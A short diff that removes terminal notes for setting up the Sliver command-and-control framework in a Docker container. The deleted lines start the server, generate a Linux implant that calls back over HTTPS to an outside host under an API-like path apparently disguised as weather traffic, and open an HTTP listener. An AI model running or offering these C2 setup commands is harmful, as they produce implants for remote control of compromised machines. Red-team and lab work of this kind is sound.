@@ -1,7 +1,0 @@
-root@ubu:/home/weather-c2# docker compose exec -it sliver /bin/bash
-
-root@d9f1e99d3f47:/home/sliver# /opt/sliver-server 
-
-[server] sliver > generate --http https://ubu.jon.devs:443/api/current/ --os linux --arch amd64 --save /home/sliver/builds 
-
-[server] sliver > http --lport 8080 --lhost 0.0.0.0
